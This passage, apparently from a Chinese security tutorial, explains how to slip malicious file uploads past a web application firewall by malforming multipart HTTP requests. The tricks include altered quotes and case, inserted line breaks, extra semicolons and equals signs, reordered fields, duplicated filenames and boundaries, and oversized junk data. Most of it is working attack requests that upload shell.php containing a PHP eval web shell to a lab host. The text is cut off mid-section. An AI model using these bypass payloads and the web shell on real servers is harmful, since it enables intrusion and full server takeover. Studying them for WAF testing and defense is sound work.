id="5-1-1-文件上传在数据包中可修改的地方"><a href="#5-1-1-文件上传在数据包中可修改的地方" class="headerlink" title="5.1.1 文件上传在数据包中可修改的地方"></a>5.1.1 文件上传在数据包中可修改的地方</h3><p><strong>Content-Disposition</strong>：一般可更改</p><p><strong>name</strong>：表单参数值，不能更改</p><p><strong>filename</strong>：文件名，可以更改</p><p><strong>Content-Type</strong>：文件 MIME，视情况更改</p><p><strong>boundary</strong>：内容划分，可以更改</p><h2 id="5-2-字符变异"><a href="#5-2-字符变异" class="headerlink" title="5.2 字符变异"></a>5.2 字符变异</h2><h3 id="5-2-1-引号变换"><a href="#5-2-1-引号变换" class="headerlink" title="5.2.1 引号变换"></a>5.2.1 引号变换</h3><p>头部字段的值既可以添加单引号也可以添加双引号还可以不加引号，都不会影响上传结果。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&quot;form-data&quot;</span>; name=file_x; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=file_x; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=file_x; filename=xx.<span class="property">php</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=xx.<span class="property">php</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&#x27;file_x&#x27;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&#x27;form-data&#x27;</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br></pre></td></tr></table></figure><p>可以去除掉<code>filename</code>字符串中末尾的引号，也能够正常上传。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>file_x<span class="string">&quot;; filename=&#x27;xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>file_x<span class="string">&quot;; filename=&quot;</span>xx.<span class="property">php</span>;</span><br></pre></td></tr></table></figure><h3 id="5-2-2-大小写变换"><a href="#5-2-2-大小写变换" class="headerlink" title="5.2.2 大小写变换"></a>5.2.2 大小写变换</h3><p>对这三个固定的字符串进行大小写转换</p><p>Content-Disposition  name  filename</p><p>比如<code>name</code>转换成<code>Name</code>，<code>Content-Disposition</code>转换成<code>content-disposition</code>。</p><h3 id="5-2-3-添加换行符"><a href="#5-2-3-添加换行符" class="headerlink" title="5.2.3 添加换行符"></a>5.2.3 添加换行符</h3><p>字段值与等号之间可以加入换行符，依然可以正常上传，下面我使用<code>[0x0a]</code>代替换行符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&quot;form-data&quot;</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=[<span class="number">0x0a</span>]<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&quot;form-data&quot;</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=[<span class="number">0x0a</span>]<span class="string">&quot;xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: &quot;</span>form-data<span class="string">&quot;; name=&quot;</span>file_x<span class="string">&quot;; filename=[0x0a]&quot;</span>xx.<span class="property">php</span><span class="string">&quot;[0x0a]</span></span><br><span class="line"><span class="string">Content-Disposition: &quot;</span>form-data<span class="string">&quot;; name=&quot;</span>file_x<span class="string">&quot;; filename=[0x0a]xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: &quot;</span>form-data<span class="string">&quot;; name=&quot;</span>file_x<span class="string">&quot;; filename=[0x0a]xx.php[0x0a];</span></span><br></pre></td></tr></table></figure><h3 id="5-2-4-多个分号"><a href="#5-2-4-多个分号" class="headerlink" title="5.2.4 多个分号"></a>5.2.4 多个分号</h3><p>文件解析时，可能因为分号解析不到文件名，导致绕过。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;file_x&quot;</span>;;; filename=<span class="string">&quot;test.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-2-5-多个等号"><a href="#5-2-5-多个等号" class="headerlink" title="5.2.5 多个等号"></a>5.2.5 多个等号</h3><p>在POST的内容中使用多个等号对文件上传也没有影响。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name==<span class="string">&quot;file_x&quot;</span>; filename====<span class="string">&quot;test.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-2-6-变换Content-Disposition的值"><a href="#5-2-6-变换Content-Disposition的值" class="headerlink" title="5.2.6 变换Content-Disposition的值"></a>5.2.6 变换Content-Disposition的值</h3><p>某些WAF在解析的时候，认为<code>Content-Disposition</code>值一定是<code>form-data</code>，造成绕过。其实<code>Content-Disposition</code>可以任意变换或为空。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: fOrM-<span class="title class_">DaTA</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-da+ta; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: fo    r m-dat a; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-dataxx; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-2-7-畸形的boundary头部"><a href="#5-2-7-畸形的boundary头部" class="headerlink" title="5.2.7 畸形的boundary头部"></a>5.2.7 畸形的boundary头部</h3><p><code>boundary</code>可以变化为如下形式，且不影响上传：</p><p>正常的<code>boundary</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure><p>畸形的<code>boundary</code>：</p><ul><li><code>multipart/form-data</code>大小写可变：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: mUltiPart/<span class="title class_">ForM</span>-dATa; boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure><ul><li><code>multipart/form-data</code>与<code>boundary</code>之间可以使用空格分隔，且中间可以插入任何值：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data x boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data abcdefg boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data a\|/?!@#$%^() boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure><ul><li><code>multipart/form-data</code>与<code>boundary</code>之间可以使用逗号分隔，且中间可以插入任何值：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,x,boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,abcdefg,boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,a\|/?!@#$%^(),boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure><ul><li><code>boundary</code>之前可以直接加入任何值（PHP可行）：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data;bypass&amp;<span class="number">123</span>**&#123;|&#125;boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data bypass&amp;<span class="number">123</span>**&#123;|&#125;boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,bypass&amp;<span class="number">123</span>**&#123;|&#125;boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure><ul><li><code>boundary</code>末尾可以使用逗号或分号隔开插入任何值</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundarye111</span>;123abc</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundarye111</span>,123abc</span><br></pre></td></tr></table></figure><h2 id="5-3-顺序颠倒"><a href="#5-3-顺序颠倒" class="headerlink" title="5.3 顺序颠倒"></a>5.3 顺序颠倒</h2><h3 id="5-3-1-交换name和filename的顺序"><a href="#5-3-1-交换name和filename的顺序" class="headerlink" title="5.3.1 交换name和filename的顺序"></a>5.3.1 交换name和filename的顺序</h3><p>因为规定了<code>Content-Disposition</code>必须在最前面，所以只能交换name和filename的顺序。</p><p>有的WAF可能会匹配<code>name</code>在前面，<code>filename</code>在后面，可以导致绕过。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; filename=<span class="string">&quot;xx.php&quot;</span>; name=<span class="string">&quot;file_x&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-3-2-交换Content-Disposition和Content-Type的顺序"><a href="#5-3-2-交换Content-Disposition和Content-Type的顺序" class="headerlink" title="5.3.2 交换Content-Disposition和Content-Type的顺序"></a>5.3.2 交换Content-Disposition和Content-Type的顺序</h3><p>与上述一样，Content-Disposition和Content-Type也是能够交换顺序的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-3-3-交换不同boundary内容的顺序"><a href="#5-3-3-交换不同boundary内容的顺序" class="headerlink" title="5.3.3 交换不同boundary内容的顺序"></a>5.3.3 交换不同boundary内容的顺序</h3><p>不同boundary内容也能够交换，且不影响文件上传</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure><h2 id="5-4-数据重复"><a href="#5-4-数据重复" class="headerlink" title="5.4 数据重复"></a>5.4 数据重复</h2><h3 id="5-4-1-boundary内容重复"><a href="#5-4-1-boundary内容重复" class="headerlink" title="5.4.1 boundary内容重复"></a>5.4.1 boundary内容重复</h3><p>最后上传的文件是shell.php而非shell.jpg，但是如果取的文件名只取了第一个就会被Bypass。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); ?&gt;</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); ?&gt;</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>--</span><br></pre></td></tr></table></figure><p>下面这样也是可以正常上传的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>--</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>;<span class="number">123</span></span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); ?&gt;</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>--</span><br></pre></td></tr></table></figure><h3 id="5-4-2-filename重复"><a href="#5-4-2-filename重复" class="headerlink" title="5.4.2 filename重复"></a>5.4.2 filename重复</h3><p>最终上传成功的文件名是shell.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="5-5-数据溢出"><a href="#5-5-数据溢出" class="headerlink" title="5.5 数据溢出"></a>5.5 数据溢出</h2><h3 id="5-5-1-name与filename之间插入垃圾数据"><a href="#5-5-1-name与filename之间插入垃圾数据" class="headerlink" title="5.5.1 name与filename之间插入垃圾数据"></a>5.5.1 name与filename之间插入垃圾数据</h3><p>name与filename之间插入大量垃圾数据。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">02</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; </span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure><p>注：需在大量垃圾数据后加“;”</p><h3 id="5-5-2-boundary字符串中加入垃圾数据"><a href="#5-5-2-boundary字符串中加入垃圾数据" class="headerlink" title="5.5.2 boundary字符串中加入垃圾数据"></a>5.5.2 boundary字符串中加入垃圾数据</h3><p>boundray字符串的值可以为任何数据（有一定的长度限制），当长度达到WAF无法处理时，而Web<a href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>又能够处理，那么就可以绕过WAF上传文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">01</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9--</span><br></pre></td></tr></table></figure><h3 id="5-5-3-boundray末尾插入垃圾数据"><a href="#5-5-3-boundray末尾插入垃圾数据" class="headerlink" title="5.5.3 boundray末尾插入垃圾数据"></a>5.5.3 boundray末尾插入垃圾数据</h3><p>刚才讲到过<code>boundary</code>末尾可以插入任何数据，那么就可以在<code>boundary</code>字符串末尾加入大量垃圾数据。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 